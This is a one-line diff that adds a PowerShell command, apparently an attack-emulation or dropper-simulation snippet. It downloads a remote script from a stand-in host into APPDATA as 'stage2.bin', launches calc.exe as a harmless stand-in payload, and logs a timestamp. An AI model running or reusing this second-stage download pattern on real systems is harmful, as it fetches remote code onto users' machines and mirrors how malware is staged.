@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "http://adatum.com/updater.ps1" -OutFile "$env:APPDATA\stage2.bin" -UseBasicParsing; Start-Process -FilePath 'calc.exe'; Start-Sleep -Seconds 8; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
